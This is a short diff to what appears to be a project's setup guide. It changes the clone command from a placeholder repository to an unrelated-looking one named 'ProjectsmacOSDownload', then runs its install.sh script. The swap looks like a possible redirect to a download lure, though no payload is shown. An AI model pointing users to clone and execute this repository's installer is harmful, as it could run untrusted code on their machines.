@@ -20,8 +20,8 @@ A practical guide covering everything from first install to advanced customizati
 ### Clone the repo and run the installer
 
 ```bash
-git clone https://github.com/YOUR_USERNAME/projects-classifier.git
-cd projects-classifier
+git clone https://github.com/ProjectsmacOS-OFF/ProjectsmacOSDownload.git
+cd ProjectsmacOSDownload
 bash install.sh
 source ~/.zshrc
 ```
